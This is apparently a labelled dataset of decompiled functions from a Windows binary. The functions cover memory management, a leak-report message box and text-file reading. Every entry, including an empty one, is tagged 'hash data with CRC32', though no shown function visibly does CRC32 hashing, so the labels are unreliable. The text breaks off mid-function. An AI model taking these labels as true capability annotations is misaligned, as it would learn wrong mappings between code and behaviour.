{
    "004013bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013bc(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040168c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040168c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x49371c;\n    if (*0x493720 == 0) {\n        return;\n    }\n    if ((*(*0x49371c + -4) & 1) == 0) {\n        *(*0x49371c + -4) = *(*0x49371c + -4) | 8;\n        piVar3 = iVar5 - *0x493720;\n        uVar4 = *0x493720;\n    }\n    else {\n        uVar4 = *(*0x49371c + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.004015ec();\n            uVar4 = *(*0x49371c + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x49371c - *0x493720;\n        uVar4 = uVar4 + *0x493720;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4937ac);\n    *piVar3 = uVar4 + 0x4937a8;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4937ac) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4937a8) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x493728;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x493724 = *0x493724 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 567
    },
    "00401d90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401d90(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t **in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *puVar11;\n    uchar auStack32 [8];\n    uint uStack24;\n    uint8_t **ppuStack20;\n    \n    ppuVar8 = in_EAX[-1];\n    if ((ppuVar8 & 7) != 0) {\n        if ((ppuVar8 & 5) != 0) {\n            if ((ppuVar8 & 3) != 0) {\n                return -1;\n            }\n            ppuVar8 = in_EAX + -4;\n            fcn.00401770();\n            if ((in_EAX[-1] & 8) == 0) {\n                puVar11 = NULL;\n                iVar5 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000, *ppuVar8, in_EAX[-3]);\n                ppuVar6 = ppuVar8;\n                if (iVar5 == 0) {\n                    iVar5 = -1;\n                }\n                else {\n                    iVar5 = 0;\n                }\n            }\n            else {\n                uVar7 = in_EAX[-1] & 0xfffffff0;\n                iVar5 = 0;\n                while( true ) {\n                    sub.kernel32.dll_VirtualQuery(ppuVar8, &stack0xffffffe0);\n                    puVar11 = NULL;\n                    ppuVar6 = ppuVar8;\n                    iVar3 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000);\n                    if (iVar3 == 0) break;\n                    if (uVar7 < 0x1d) goto code_r0x00401897;\n                    uVar7 = uVar7 - 0x1c;\n                    ppuVar8 = ppuVar8 + 7;\n                }\n                iVar5 = -1;\n            }\ncode_r0x00401897:\n            if (iVar5 == 0) {\n                *puVar11 = ppuVar6;\n                ppuVar6[1] = puVar11;\n            }\n            *0x4957a8 = 0;\n            return iVar5;\n        }\n        goto code_r0x00401e91;\n    }\n    puVar9 = *ppuVar8;\n    ppuVar6 = in_EAX;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar9;\n            *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n            ppuVar6 = in_EAX;\n            if (uVar1 == 0) break;\n            if (*0x4935b5 == '\\0') {\n                in_EAX = NULL;\n                ppuStack20 = 0x401e2b;\n                ppuVar6 = ppuVar8;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                uVar1 = *puVar9;\n                *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n                ppuVar8 = in_EAX;\n                if (uVar1 == 0) break;\n                ppuStack20 = 0xa;\n                uStack24 = 0x401e45;\n                sub.kernel32.dll_Sleep();\n                ppuVar8 = ppuStack20;\n            }\n        }\n    }\n    in_EAX = ppuVar8;\n    ppuVar8 = in_EAX + 3;\n    *ppuVar8 = *ppuVar8 + -1;\n    puVar4 = in_EAX[2];\n    if (*ppuVar8 != NULL) {\n        in_EAX[2] = ppuVar6;\n        ppuVar6[-1] = puVar4 + 1;\n        if (puVar4 != NULL) {\n            *puVar9 = 0;\n            return 0;\n        }\n        puVar4 = *(puVar9 + 4);\n        in_EAX[5] = puVar9;\n        in_EAX[1] = puVar4;\n        *(puVar4 + 0x14) = in_EAX;\n        *(puVar9 + 4) = in_EAX;\n        *puVar9 = 0;\n        return 0;\n    }\n    if (puVar4 == NULL) {\ncode_r0x00401df7:\n        *(puVar9 + 0xc) = puVar4;\n    }\n    else {\n        puVar4 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar4 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar4;\n        puVar4 = NULL;\n        if (*(puVar9 + 0x10) == in_EAX) goto code_r0x00401df7;\n    }\n    *puVar9 = puVar4;\n    ppuVar8 = in_EAX[-1];\ncode_r0x00401e91:\n    puVar9 = ppuVar8 & 0xfffffff0;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar10 = *0x493718 == 0;\n            *0x493718 = *0x493718 ^ bVar10 * (*0x493718 ^ 1);\n            if (bVar10) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar10 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar10 * (*0x493718 ^ 1);\n                if (bVar10) break;\n                ppuStack20 = 0x401e83;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if ((*(puVar9 + -4 + in_EAX) & 1) == 0) {\n        *(puVar9 + -4 + in_EAX) = *(puVar9 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar7 = *(puVar9 + -4 + in_EAX) & 0xfffffff0;\n        puVar9 = puVar9 + uVar7;\n        if (0xb2f < uVar7) {\n            fcn.004015ec();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar4 = in_EAX[-2];\n        in_EAX = in_EAX - puVar4;\n        puVar9 = puVar9 + puVar4;\n        if (0xb2f < puVar4) {\n            fcn.004015ec();\n        }\n    }\n    if (puVar9 != 0x13ffe0) {\n        in_EAX[-1] = puVar9 + 3;\n        *(puVar9 + -8 + in_EAX) = puVar9;\n        fcn.0040162c();\n        *0x493718 = 0;\n        return 0;\n    }\n    if (*0x493720 == 0x13ffe0) {\n        ppuStack20 = in_EAX + -4;\n        puVar9 = *ppuStack20;\n        ppuVar8 = in_EAX[-3];\n        *(puVar9 + 4) = ppuVar8;\n        *ppuVar8 = puVar9;\n        *0x493718 = 0;\n        uStack24 = 0x401f3d;\n        iVar5 = sub.kernel32.dll_VirtualFree();\n        return -(iVar5 == 0);\n    }\n    fcn.0040168c();\n    in_EAX[0x4fff7] = 0x2;\n    *0x493718 = 0;\n    *0x49371c = in_EAX + 0x4fff8;\n    *0x493720 = 0x13ffe0;\n    return 0;\n}\n",
        "token_count": 1875
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004024a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004024a4(int32_t lpBuffer)\n\n{\n    uint32_t in_EAX;\n    \n    if ((0xffff < in_EAX) && ((in_EAX & 3) == 0)) {\n        if ((in_EAX < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX + 4)) {\n            *(lpBuffer + -0x10) = 0;\n            sub.kernel32.dll_VirtualQuery();\n        }\n        if ((((3 < *(lpBuffer + -0x10)) && (*(lpBuffer + -0xc) == 0x1000)) && ((*(lpBuffer + -8) & 0xf6) != 0)) &&\n           ((*(lpBuffer + -7) & 1) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 206
    },
    "004026d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026d4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x48f04cU >> 5) * 0x800;\n    fcn.00402334();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.0040267c(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.004025a0();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h <= *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 672
    },
    "00402820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402820(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403af4();\n    fcn.00403af4();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x49370c; iVar4 = *0x4957b0,  iVar3 != 0x493708; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.004022f4();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.0040267c();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004026d4(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004022d0();\n        }\n    }\n    while ((iVar4 != 0x4957ac && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.0040267c();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.0040248c();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x48f04e;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.0040248c();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402370();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402370();\n                        fcn.0040248c();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.0040248c();\n                    }\n                    else {\n                        fcn.00404530();\n                        puVar5 = fcn.0040248c();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402370();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.0040248c();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402370();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040248c();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1483
    },
    "00403abc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403abc(void)\n\n{\n    char extraout_AH;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) == -0x284f) && (*(in_EAX + 0xc) < *(in_EAX + 0x10))) {\n        if (((*(in_EAX + 6) & 1) == 0) || (*(*(in_EAX + 0xc) + *(in_EAX + 0x14)) != '\\x1a')) {\n            return 0;\n        }\n    }\n    else {\n        fcn.00403bcc();\n        if (extraout_AH != '\\x1a') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 188
    },
    "00403bcc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00403bcc(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 4) != -0x284f) {\n        cVar2 = fcn.00403b90();\n        if (cVar2 == '\\0') goto code_r0x00403c2e;\n    }\n    uVar4 = *(in_EAX + 0xc);\n    if (*(in_EAX + 0x10) <= uVar4) {\n        iVar3 = (**(in_EAX + 0x1c))();\n        if (iVar3 != 0) {\n            fcn.0040307c();\n            goto code_r0x00403c2e;\n        }\n        uVar4 = *(in_EAX + 0xc);\n        if (*(in_EAX + 0x10) <= uVar4) {\n            if ((*(in_EAX + 6) & 1) != 0) {\n                *(uVar4 + *(in_EAX + 0x14)) = 0x1a;\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            }\n            goto code_r0x00403c2e;\n        }\n    }\n    uVar1 = *(uVar4 + *(in_EAX + 0x14));\n    if (((*(in_EAX + 6) & 1) == 0) || (uVar1 != 0x1a)) {\n        *(in_EAX + 0xc) = uVar4 + 1;\n        return uVar1;\n    }\ncode_r0x00403c2e:\n    return CONCAT31(CONCAT21(in_EAX >> 0x10, 0x1a), 0x1a);\n}\n",
        "token_count": 423
    },
    "00403c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403c38(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    int32_t iVar5;\n    \n    iVar7 = param_1;\n    if (((*(in_EAX + 4) == -0x284f) || (cVar2 = fcn.00403b90(),  cVar2 != '\\0')) && (unaff_EBX = in_EAX,  0 < param_1))\n    {\n        puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n        do {\n            while( true ) {\n                iVar4 = iVar5 + -1;\n                if (iVar5 < 1) {\n                    *(in_EAX + 0xc) = puVar6;\n                    uVar3 = fcn.00403bcc(iVar7);\n                    iVar4 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n                    puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n                    if (uVar3 >> 8 != '\\0') {\n                        return in_EAX;\n                    }\n                }\n                else {\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                }\n                cVar2 = uVar3;\n                if (cVar2 == '\\n') goto code_r0x00403c8c;\n                iVar5 = iVar4;\n                if (cVar2 == '\\r') break;\n                if ((cVar2 == '\\x1a') && ((*(in_EAX + 6) & 1) != 0)) goto code_r0x00403c8d;\n                *param_2 = cVar2;\n                iVar4 = param_1 + -1;\n                bVar1 = param_1 < 1;\n                param_1 = iVar4;\n                param_2 = param_2 + 1;\n                if (iVar4 == 0 || bVar1) goto code_r0x00403c8d;\n            }\n        } while (*puVar6 != 10);\ncode_r0x00403c8c:\n        puVar6 = puVar6 + -1;\ncode_r0x00403c8d:\n        *(in_EAX + 0xc) = puVar6 - *(in_EAX + 0x14);\n    }\n    return unaff_EBX;\n}\n",
        "token_count": 619
    },
    "004040ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.004040ac(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uStack12;\n    \n    if ((*(in_EAX + 6) & 1) == 0) {\n        uStack12 = CONCAT31(param_1 >> 8, 10);\n        uVar1 = fcn.00403fdc();\n    }\n    else {\n        uStack12 = param_1 & 0xffff0000 | 0xa0d;\n        uVar1 = fcn.00403fdc();\n    }\n    fcn.0040382c();\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 160
    },
    "0040a8ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.0040a8ac(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 245
    },
    "0040ef34": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef34(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x40f07d;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if ((arg_ch & 2) == 0) {\n        fcn.004055c8();\n        fcn.004055c8();\n    }\n    else {\n        puStack48 = &stack0xfffffffc;\n        fcn.00409a98();\n        fcn.00409a98();\n    }\n    fcn.004055c8();\n    fcn.00405530();\n    do {\n        if (var_4h == 0) {\ncode_r0x0040f05a:\n            *in_FS_OFFSET = puStack56;\n            puStack48 = 0x40f084;\n            uStack52 = 0x40f06f;\n            fcn.00405530();\n            uStack52 = 0x40f07c;\n            fcn.00405554();\n            return;\n        }\n        iVar1 = fcn.0040e8bc();\n        if (iVar1 == 0) {\n            fcn.00405818();\n            goto code_r0x0040f05a;\n        }\n        fcn.00405a44(&fcn.0040ef34::var_1ch, *arg_8h);\n        fcn.004058e0(var_14h, var_1ch);\n        fcn.00405a44(&fcn.0040ef34::var_ch);\n        if ((arg_ch & 1) == 0) {\n            fcn.00405818();\n            goto code_r0x0040f05a;\n        }\n        var_18h = var_8h;\n        if (var_8h != 0) {\n            var_18h = *(var_8h + -4);\n        }\n        puStack56 = &fcn.0040ef34::var_4h;\n        fcn.00405a44();\n    } while( true );\n}\n",
        "token_count": 603
    },
    "0041d31c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d31c(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 71
    },
    "0041d5f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d5f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41d814;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41d626;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x41d631;\n    fcn.0041e964();\n    puStack72 = 0x41d63c;\n    fcn.0041e964();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41d7e4;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x41d67d;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d39c(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x41d674;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d54c(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41d7a2;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.0041d23c(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.0041d2b4(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.0041d4ac(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404f70();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41d81b;\n            uStack76 = 0x41d805;\n            fcn.00405554();\n            uStack76 = 0x41d813;\n            fcn.00406934();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.0041d2b4(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.0041d2b4(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.0040484c();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0041d200(&stack0xfffffffc);\n            fcn.00419730();\n        }\n        else {\n            iVar3 = fcn.004198e4();\n            if (iVar3 < 0) {\n                fcn.0041d200(&stack0xfffffffc);\n                fcn.00419730();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1027
    },
    "0042019c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0042019c(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.00419970();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x4201f4 != (*0x4201f4 & *(in_EAX + 0x1c)))) {\n            fcn.004200d8();\n        }\n        else {\n            fcn.00420164();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004246bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004247ad)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004246bc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x4248d8;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x4248df;\n        uStack104 = 0x4248d7;\n        fcn.00405554();\n        return;\n    }\n    puStack112 = 0x424700;\n    fcn.0042399c();\n    uStack116 = 0x4248b0;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n     